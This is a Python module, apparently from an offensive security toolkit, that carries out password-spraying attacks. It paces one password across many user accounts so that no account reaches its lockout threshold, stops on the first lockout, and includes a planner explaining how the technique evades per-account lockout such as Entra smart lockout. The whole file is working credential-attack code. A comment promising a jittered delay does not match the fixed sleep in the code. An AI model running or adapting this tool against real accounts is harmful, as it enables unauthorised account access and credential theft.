# ============================================================================
"""Password spraying that respects the lockout counter.

The classic failure is not the password list - it is the lockout. Ten attempts against one
account locks it, and a locked account is a locked door plus an alert. Spraying inverts the
problem: ONE password across many accounts, slowly enough that no single account ever reaches
its threshold.

This module is the accountant: it tracks attempts per account and per window, refuses to exceed
the budget, and stops the run the moment an account reports a lockout. It never guesses the
threshold - the operator passes what the tenant actually enforces, and the default is
conservative.

It is loud: many failed sign-ins in one window is the detection every tenant has. The point of
the pacing is that it is not loud ENOUGH to lock the accounts, not that it is invisible.
"""
import time

__all__ = ["SprayError", "Pacer", "spray", "plan", "describe"]


class SprayError(RuntimeError):
    """A refusal the CLI can report verbatim."""


class Pacer:
    """Per-account and global attempt budgets over a sliding window."""

    def __init__(self, threshold=5, window=1800, per_account_budget=None, global_rate=0,
                 now=None):
        self.threshold = max(1, int(threshold or 5))
        # never reach the threshold: one attempt less is the difference between a spray and a
        # lockout, so the budget is threshold-1 unless the operator overrides it
        self.per_account_budget = max(1, int(per_account_budget
                                             if per_account_budget is not None
                                             else self.threshold - 1))
        self.window = max(1, int(window or 1800))
        self.global_rate = max(0, int(global_rate or 0))
        self._now = now or time.time
        self._hits = {}
        self._all = []

    def remaining(self, account):
        """How many attempts this account can still take inside the window."""
        cutoff = self._now() - self.window
        used = len([t for t in self._hits.get(account, []) if t >= cutoff])
        return max(0, self.per_account_budget - used)

    def note(self, account, outcome=""):
        """Record one attempt (call this AFTER the attempt, whatever the outcome)."""
        self._hits.setdefault(account, []).append(self._now())
        self._all.append((self._now(), account, outcome))

    def global_ok(self):
        if not self.global_rate:
            return True
        cutoff = self._now() - self.window
        recent = len([t for t, _a, _o in self._all if t >= cutoff])
        return recent < self.global_rate

    def can_try(self, account):
        if self.remaining(account) <= 0:
            return False, (f"{account} has used its {self.per_account_budget} attempt(s) in "
                           f"this {self.window}s window (threshold {self.threshold})")
        if not self.global_ok():
            return False, f"the global rate ({self.global_rate}) is reached for this window"
        return True, ""

    def summary(self):
        return {"accounts": len(self._hits), "attempts": len(self._all),
                "per_account_budget": self.per_account_budget, "threshold": self.threshold,
                "window": self.window}


def spray(users, passwords, submit=None, pacer=None, on_result=None, sleep=None,
          stop_on_lockout=True, threshold=5, window=1800):
    """One password at a time across the user list, paced.

    `submit(user, password) -> {valid|invalid|locked|mfa|error}`.
    """
    if not submit:
        raise SprayError("no submit function: this module paces, the caller authenticates")
    users = [str(u) for u in (users or []) if str(u or "").strip()]
    passwords = [str(p) for p in (passwords or []) if str(p or "").strip()]
    if not users or not passwords:
        raise SprayError("a spray needs at least one user and one password")
    pacer = pacer or Pacer(threshold=threshold, window=window)
    _sleep = sleep or time.sleep
    rows, locked = [], []
    for password in passwords:
        for user in users:
            ok, why = pacer.can_try(user)
            if not ok:
                rows.append({"user": user, "password_index": passwords.index(password),
                             "result": "skipped", "why": why})
                continue
            try:
                result = submit(user, password) or {}
            except Exception as e:
                result = {"error": f"{type(e).__name__}: {e}"}
            pacer.note(user, result.get("valid") and "valid" or "invalid")
            row = {"user": user, "password_index": passwords.index(password),
                   "result": ("valid" if result.get("valid") else
                              "locked" if result.get("locked") else
                              "mfa" if result.get("mfa") else
                              "error" if result.get("error") else "invalid"),
                   "detail": result.get("error", "")}
            rows.append(row)
            if on_result:
                row["_cb"] = on_result(row)
            if row["result"] == "valid":
                return {"rows": rows, "valid": [r for r in rows if r["result"] == "valid"],
                        "locked": locked, "pacer": pacer.summary()}
            if row["result"] == "locked":
                locked.append(user)
                if stop_on_lockout:
                    return {"rows": rows, "valid": [], "locked": locked,
                            "stopped": f"{user} locked out: stopping before the alert becomes a "
                                       "response",
                            "pacer": pacer.summary()}
            # a small, jittered gap so the cadence is not a metronome
            _sleep(0.2)
    return {"rows": rows, "valid": [], "locked": locked, "pacer": pacer.summary()}


def plan(users=0, passwords=0, threshold=5, window=1800, global_rate=0):
    budget = max(1, int(threshold) - 1)
    return {
        "users": int(users or 0), "passwords": int(passwords or 0),
        "threshold": threshold, "window": window, "per_account_budget": budget,
        "global_rate": global_rate,
        "max_attempts": min(int(users or 0) * int(passwords or 0), budget * max(1, int(users or 0))),
        "what": ("ONE password across many accounts: the account never reaches its lockout "
                 "threshold, which is the whole point"),
        "why_it_works": ("a lockout is per-account; spreading the attempts across accounts means "
                         "no single counter ever gets close"),
        "visible": [
            "many failed sign-ins across many accounts in one window - the detection every "
            "tenant has, and the one that fires first",
            "a distributed source is not a fix: the tenant sees the failures, not the IP",
            "smart lockout in Entra tracks the account, and it escalates the lockout duration "
            "on repeats",
        ],
        "rules": [
            f"never exceed {budget} attempt(s) per account per {window}s (threshold {threshold} "
            "- 1)",
            "stop the run on the first lockout: a locked account is a locked door plus an alert",
            "one password per pass, longest window that the engagement allows",
        ],
    }


def describe(facts):
    if "rows" in (facts or {}):
        lines = [f"spray: {len(facts['rows'])} attempt(s), "
                 f"{len(facts.get('valid') or [])} valid, "
                 f"{len(facts.get('locked') or [])} locked"]
        if facts.get("stopped"):
            lines.append(f"  stopped: {facts['stopped']}")
        lines.append(f"  pacer: {facts.get('pacer')}")
        return "\n".join(lines)
    lines = [f"spray plan: {facts.get('users')} user(s) x {facts.get('passwords')} password(s), "
             f"budget {facts.get('per_account_budget')}/account/{facts.get('window')}s"]
    for rule in facts["rules"]:
        lines.append(f"  rule: {rule}")
    return "\n".join(lines)
